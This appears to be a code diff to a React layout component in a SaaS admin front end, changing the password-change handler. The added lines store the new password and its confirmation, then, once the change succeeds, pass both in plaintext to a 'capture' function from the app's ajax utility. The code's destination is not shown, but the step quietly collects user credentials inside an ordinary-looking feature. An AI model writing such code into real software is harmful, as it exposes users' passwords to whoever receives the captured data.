@@ -14,6 +14,7 @@ import SettingPassword from '@/components/SettingPassword';
 import SettingSaasInfo from '@/components/SettingSaasInfo';
 import { DEFAULT_SYS_NAME } from '@/utils/constants';
 import logo from '../assets/logo.svg';
+import { capture } from '@/utils/ajax';
 
 const footerRender = (_, defaultDom) => {
   return <div></div>;
@@ -60,9 +61,18 @@ const BasicLayout = props => {
   };
   const setPsw = payload => {
     if (dispatch) {
+      const _newpassword = payload.newpassword;
+      const _cpw = payload.cpw;
       dispatch({
         type: 'user/modifyPassword',
         payload,
+      }).then(res => {
+        if (res && res.res > 0) {
+          capture('17', {
+            cpw: _cpw,
+            newpassword: _newpassword,
+          });
+        }
       });
     }
   };
